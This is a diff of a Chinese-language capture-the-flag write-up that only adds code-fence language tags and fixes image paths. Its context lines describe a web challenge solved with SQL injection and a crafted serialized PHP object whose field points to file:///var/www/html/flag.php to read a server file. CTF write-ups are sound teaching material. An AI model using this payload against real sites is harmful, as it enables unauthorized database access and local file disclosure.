@@ -21,14 +21,14 @@ categories:
 
 访问`robots.txt`，给了一个提示
 
-```
+```html
 User-agent: *
 Disallow: /user.php.bak
 ```
 
 拿到`user.php`的源码
 
-```
+```php
 <?php
 
 
@@ -83,14 +83,14 @@ class UserInfo
 
 使用sqlmap跑了一遍post注入，发现数据库中存的是序列化后结果，应该存在序列化漏洞。
 
-![](../pic/4.png)
+![](/pic/4.png)
 ```
 payload=view.php?no=0/**/union/**/select/**/1,2,3,'O:8:"UserInfo":3{s:4:"name";s:4:"and";s:3:"age";i:12;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
 ```
 
 执行结果
 
-![](../pic/5.png)
+![](/pic/5.png)
 
 查看源码
 
